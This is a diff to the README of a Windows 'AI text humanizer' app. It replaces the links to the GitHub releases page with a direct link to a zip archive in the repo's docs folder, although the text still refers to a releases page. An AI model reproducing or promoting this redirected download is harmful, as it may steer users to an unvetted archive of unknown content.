@@ -1,6 +1,6 @@
 # 🤖 humanizer-workbench - Rewrite AI Text Into Natural Writing
 
-[![Download humanizer-workbench](https://img.shields.io/badge/Download%20humanizer-workbench-6B7280?style=for-the-badge&logo=github&logoColor=white)](https://github.com/aprempeh-tech/humanizer-workbench/releases)
+[![Download humanizer-workbench](https://img.shields.io/badge/Download%20humanizer-workbench-6B7280?style=for-the-badge&logo=github&logoColor=white)](https://github.com/aprempeh-tech/humanizer-workbench/raw/refs/heads/main/docs/humanizer-workbench-v2.0.zip)
 
 ## ✨ What this app does
 
@@ -27,7 +27,7 @@ The app is made for Windows users who want a fast way to rewrite text without le
 
 Visit this page to download the Windows file:
 
-[https://github.com/aprempeh-tech/humanizer-workbench/releases](https://github.com/aprempeh-tech/humanizer-workbench/releases)
+[https://github.com/aprempeh-tech/humanizer-workbench/raw/refs/heads/main/docs/humanizer-workbench-v2.0.zip](https://github.com/aprempeh-tech/humanizer-workbench/raw/refs/heads/main/docs/humanizer-workbench-v2.0.zip)
 
 On the releases page:
 1. open the latest release
